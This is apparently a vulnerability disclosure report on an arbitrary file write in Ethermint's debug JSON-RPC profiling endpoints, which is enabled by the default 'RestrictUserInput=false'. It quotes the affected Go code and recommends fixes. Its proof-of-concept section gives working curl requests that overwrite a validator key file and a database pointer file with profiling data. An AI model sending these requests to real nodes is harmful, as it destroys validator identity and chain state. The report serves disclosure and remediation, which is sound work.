### Title
Arbitrary File Write via User-Controlled Path in Debug JSON-RPC API (Default `RestrictUserInput=false`) — (File: `rpc/namespaces/ethereum/debug/utils.go`)

---

### Summary

The Ethermint debug JSON-RPC namespace exposes multiple profiling endpoints (`debug_startCPUProfile`, `debug_goTrace`, `debug_blockProfile`, `debug_writeBlockProfile`, `debug_writeMemProfile`, `debug_mutexProfile`, `debug_writeMutexProfile`) that accept a user-controlled file path. The server-side path validation (`validatePath`) and file creation (`restrictedCreate`) only enforce directory-confinement and overwrite-prevention when the `restrict-user-input` configuration flag is `true`. That flag **defaults to `false`** in `DefaultJSONRPCConfig`. When the debug namespace is enabled and the default configuration is used, any unauthenticated caller can direct the node process to create or overwrite an arbitrary file on the host filesystem with binary pprof data, truncating its previous contents.

---

### Finding Description

`validatePath` in `rpc/namespaces/ethereum/debug/utils.go` resolves the caller-supplied path to an absolute path but applies no further restriction unless `srvflags.JSONRPCRestrictUserInput` is `true`:

`restrictedCreate` similarly falls back to a plain `os.Create` (which truncates the target) when the flag is off:

```go
// restrictedCreate – lines 96-101
func restrictedCreate(ctx *server.Context, fp string) (*os.File, error) {
    if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
        return os.OpenFile(fp, os.O_RDWR|os.O_CREATE|os.O_EXCL, 0o666)
    }
    return os.Create(fp)   // ← truncates any existing file
}
```

The default value of `RestrictUserInput` is `false`:

```go

RestrictUserInput: false,
```

The debug namespace is registered as `Public: true` with no authentication layer:

```go
// rpc/apis.go – lines 169-176
return []rpc.API{{
    Namespace: DebugNamespace,
    Version:   apiVersion,
    Service:   debug.NewAPI(ctx, evmBackend),
    Public:    true,
}}
```

Every profiling call that accepts a file path (`StartCPUProfile`, `GoTrace`, `BlockProfile`, `WriteBlockProfile`, `WriteMemProfile`, `MutexProfile`, `WriteMutexProfile`) routes through `validatePath` + `restrictedCreate`, so all are affected.

---

### Impact Explanation

When the debug namespace is enabled and `RestrictUserInput` is left at its default (`false`), an unauthenticated attacker with network access to the JSON-RPC port can:

1. **Truncate critical node files** — calling `debug_startCPUProfile` with a path such as the node's private validator key (`priv_validator_key.json`), the node key (`node_key.json`), or the CometBFT/IAVL database files immediately truncates those files to zero bytes via `os.Create`. A truncated validator key causes the node to fail on the next restart; a truncated database causes immediate state corruption.
2. **Overwrite files with pprof binary data** — stopping the profile (`debug_stopCPUProfile`) writes binary pprof content into the target, permanently corrupting it.
3. **Chain halt / consensus failure** — if enough validators run with the debug namespace exposed and default config, an attacker can corrupt their key material or state databases, halting the chain or causing deterministic consensus failure.

This matches the allowed Critical impact: *"Valid unprivileged RPC submission can halt the chain, corrupt committed state, or cause deterministic validator consensus failure."*

---

### Likelihood Explanation

- The debug namespace is **not** in the default API list (`["eth", "net", "web3"]`), so operators must explicitly add `"debug"` to `json-rpc.api`. This is a common operational step for nodes that serve RPC publicly (e.g., archive nodes, public endpoints).
- Once enabled, the namespace is `Public: true` with **no authentication**. Any client that can reach the JSON-RPC port can call these methods.
- `RestrictUserInput` defaults to `false`; the only protection is a documentation comment ("must be set to true if serving debug namespace to the public") with no runtime enforcement.
- The combination of "debug enabled + default config" is a realistic deployment scenario, making exploitation straightforward for any attacker with network access to the RPC port.

---

### Recommendation

1. **Change the default**: Set `RestrictUserInput: true` in `DefaultJSONRPCConfig` so that path confinement is active by default whenever the debug namespace is enabled.
2. **Enforce at registration time**: When the `debug` namespace is added to the API list, assert that `RestrictUserInput` is `true` and refuse to start (or emit a hard warning) if it is not.
3. **Separate the flag from the debug namespace**: Consider making `RestrictUserInput` a prerequisite for enabling the debug namespace rather than an independent opt-in.

---

### Proof of Concept

With a node running `json-rpc.api = "eth,net,web3,debug"` and default `restrict-user-input = false`:

```bash
# Truncate and overwrite the validator key with pprof data
curl -X POST http://<node>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_startCPUProfile",
       "params":["/home/validator/.evmd/config/priv_validator_key.json"],
       "id":1}'

# Immediately stop to flush pprof binary into the key file
curl -X POST http://<node>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_stopCPUProfile","params":[],"id":2}'
```

After the second call, `priv_validator_key.json` contains binary pprof data. The node fails to parse its key on the next restart, permanently losing its validator identity and halting its participation in consensus.

For a one-shot overwrite without a start/stop pair, `debug_writeBlockProfile` or `debug_writeMemProfile` can be used directly:

```bash
curl -X POST http://<node>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_writeMemProfile",
       "params":["/home/validator/.evmd/data/application.db/CURRENT"],
       "id":3}'
```

This corrupts the RocksDB/LevelDB `CURRENT` pointer file, making the state database unreadable on the next startup.

```go
func validatePath(ctx *server.Context, file string) (string, error) {
	fp, err := ExpandHome(file)
	if err != nil {
		return "", err
	}
	fp, err = filepath.Abs(fp)
	if err != nil {
		return "", err
	}
	if ctx.Viper.GetBool(srvflags.JSONRPCRestrictUserInput) {
		absDataDir, err := filepath.Abs(ctx.Config.RootDir)
		if err != nil {
			return "", err
		}
		realDataDir, err := filepath.EvalSymlinks(absDataDir)
		if err != nil {
			return "", err
		}
		// Resolve parent dir symlinks; the file itself may not exist yet.
		realParent, err := filepath.EvalSymlinks(filepath.Dir(fp))
		if err != nil {
			return "", err
		}
		fp = filepath.Join(realParent, filepath.Base(fp))
		if !strings.HasPrefix(fp, realDataDir+string(filepath.Separator)) {
			return "", errors.New("file path must be in the data directory")
		}
		// Reject a pre-existing symlink at the final component.
		if fi, err := os.Lstat(fp); err == nil && fi.Mode()&os.ModeSymlink != 0 {
			return "", errors.New("file path must not be a symlink")
		}
	}
	return fp, nil
```

```go
func (a *API) StartCPUProfile(file string) error {
	a.logger.Debug("debug_startCPUProfile", "file", file)
	a.handler.mu.Lock()
	defer a.handler.mu.Unlock()

	switch {
	case isCPUProfileConfigurationActivated(a.ctx):
		a.logger.Debug("CPU profiling already in progress using the configuration file")
		return errors.New("CPU profiling already in progress using the configuration file")
	case a.handler.cpuFile != nil:
		a.logger.Debug("CPU profiling already in progress")
		return errors.New("CPU profiling already in progress")
	default:
		fp, err := validatePath(a.ctx, file)
		if err != nil {
			a.logger.Debug("failed to get filepath for the CPU profile file", "error", err.Error())
			return err
		}
		f, err := restrictedCreate(a.ctx, fp)
		if err != nil {
			a.logger.Debug("failed to create CPU profile file", "error", err.Error())
			return err
		}
		if err := pprof.StartCPUProfile(f); err != nil {
			a.logger.Debug("cpu profiling already in use", "error", err.Error())
			if err := f.Close(); err != nil {
				a.logger.Debug("failed to close cpu profile file")
				return stderrors.Wrap(err, "failed to close cpu profile file")
			}
			return err
		}

		a.logger.Info("CPU profiling started", "profile", file)
		a.handler.cpuFile = f
		a.handler.cpuFilename = file
		return nil
	}
}
```
